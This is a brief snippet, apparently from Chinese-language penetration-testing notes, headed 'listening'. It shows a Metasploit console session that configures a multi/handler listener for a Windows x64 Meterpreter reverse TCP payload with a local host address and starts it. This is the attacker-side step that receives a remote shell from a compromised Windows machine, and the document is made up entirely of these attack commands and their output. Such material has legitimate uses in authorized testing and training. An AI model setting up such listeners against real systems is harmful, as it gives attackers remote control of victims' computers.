### 监听
```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.1
LHOST => 192.168.1.1
msf exploit(multi/handler) > run
```
